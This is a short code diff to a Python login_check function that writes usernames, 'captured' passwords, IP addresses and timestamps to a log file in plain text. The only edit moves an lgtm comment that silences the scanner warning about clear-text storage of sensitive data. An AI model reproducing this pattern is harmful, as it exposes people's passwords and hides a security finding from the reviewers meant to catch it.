@@ -341,8 +341,7 @@ def login_check():
     date = datetime.now(timezone.utc).isoformat()
     try:
         with LOG_FILE.open('a') as f:
-            # lgtm [py/clear-text-storage-of-sensitive-data]
-            f.write(f"{username}\t{captured_password}\t{ip}\t{date}\n")
+            f.write(f"{username}\t{captured_password}\t{ip}\t{date}\n") # lgtm [py/clear-text-storage-of-sensitive-data]
     except Exception:
         # If logging fails, ignore to not disrupt response
         pass
